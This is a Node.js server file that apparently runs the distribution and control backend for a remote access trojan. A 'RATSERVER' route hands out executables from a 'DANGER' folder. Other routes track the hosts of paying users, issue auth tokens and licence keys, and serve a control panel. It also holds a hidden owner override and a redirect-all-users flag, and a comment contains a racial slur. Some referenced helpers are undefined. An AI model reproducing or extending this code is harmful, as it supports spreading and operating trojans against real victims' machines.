var fs = require('fs')
var rp = require('request-promise')
get('/',()=>{})
USERSTOKENS = {}
var HOSTS={}
getRandomInt = (min,max) =>Math.floor(Math.random()*(max-min))+min
RATSERVER.get("/download/*",(req,res)=>{
    var ratexe
    if (req.params[0].indexOf("..") >= 0){return res.end('forbidden')}
    try {
    ratexe= fs.readFileSync("assets/DANGER/"+req.params[0])
    }
    catch {ratexe = 'file not found'}
    res.end(ratexe)
})
get("/api/whatismyhost",(req,res)=>{
    //alltome
var owner =!1?'b94ba92b0944e10e277a53438df09c6e':req.headers["owner"] 
var x=HOSTS[owner]
return res.end( !!x?JSON.stringify({host:x[0],isConnected:true,exists:true}):'{"isConnected":false,"exists":true}')

})

class Profile{
    constructor(id,token,banned=false){
        this.id=id
        this.banned=banned
        this.token=token
    }
}
//md5(`blyat${'USERNAME'}negr:negr${'PASSWORD'}pizdez`)
//md5(md5(md5())) 
process.REDIRECT_ALL_USERS_TO_ME=false
tokens=JSON.parse(fs.readFileSync('./profiles.js','utf8')).map(v=>new Profile(...v))
setInterval(()=>tokens=JSON.parse(fs.readFileSync('./profiles.js','utf8')).map(v=>new Profile(...v)),60000)
var authtokens=[]
class Authtoken{
    constructor(logintoken,endsAt){
        this.randomInt=getRandomInt(1,100000)
        this.createdAt=Date.now()
        this.ends=endsAt
        this.owner=logintoken
        this.auth=md5(Buffer.from(md5('xAuthtoken'+this.randomInt+':random:'+logintoken+':owner:'+endsAt+':endsAt')).toString('base64'))
        authtokens.push(this)
    }
}
setInterval(()=>{
    var dn=Date.now()
    authtokens.forEach((t,i)=>t.ends<dn?(authtokens.splice(i,1)):1)
    
    for(var k in HOSTS)(HOSTS[k][1]>=dn||delete HOSTS[k])
},1000)
get('/api/checkAuth',(req,res)=>{
    var token =req.headers.authtoken
    var found=!1
    authtokens.forEach(t=>token==t.auth?found=!0:1)
    res.end(String(found))
})
get('/api/control',(req,res)=>{
    
    if(req.headers.hasOwnProperty('verifycreds')){

        var token= req.headers.token
        
        var resp={}
        var endsAt=Date.now()+1000*60*60
        resp.success=!1
        resp.banned=!1
        var tokenobj=tokens.find(t=>t.token==token)||false
        if(tokenobj){
        if(tokenobj.banned){
            resp.success=false
            resp.banned=true
        }
        else{
            resp.success=true
            resp.authtoken=new Authtoken(token,endsAt).auth
            resp.aets=endsAt}
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Access-Control-Allow-Headers', '*');
        res.end(JSON.stringify(resp))
    }}
    else{
        res.setHeader('Access-Control-Allow-Headers', '*');
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.end(fs.readFileSync( './assets/website/index.html'))}
})
get('/api/controlPanel',(req,res)=>{
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Headers', '*');
    if(req.headers.hasOwnProperty('action')){
        var includes=!1
        authtokens.forEach(t=>t.auth==req.headers.authtoken?includes=!0:1)
        if(!includes)return res.end('Please login')

        switch (req.headers.action) {
            case 'setmyhost':
                var host=req.headers.nrhost
                var lt=authtokens.find(t=>req.headers.authtoken==t.auth)
                HOSTS[tokens.find(x=>x.token==lt.owner).id]=[host,lt.ends]
                res.write('true')
                break;

        case 'nrregkey':
                    
                    var key = getRandomInt(100000,10000000)
                    KEYS[key]=false
                    
                    res.write(key+'')
                    break;
        
            default:
                break;
        }
        
        res.end()
    }
    else{
        res.end(fs.readFileSync( './assets/website/control.html'))}
})
get('/api/isKeyAvailable/*',(req,res)=>{
        var h = req.url.split('/').pop()
        var retval = KEYS.hasOwnProperty(h)&&!KEYS[h-0]?'1':'0'
        delete KEYS[h-0]
        return res.end(retval)
})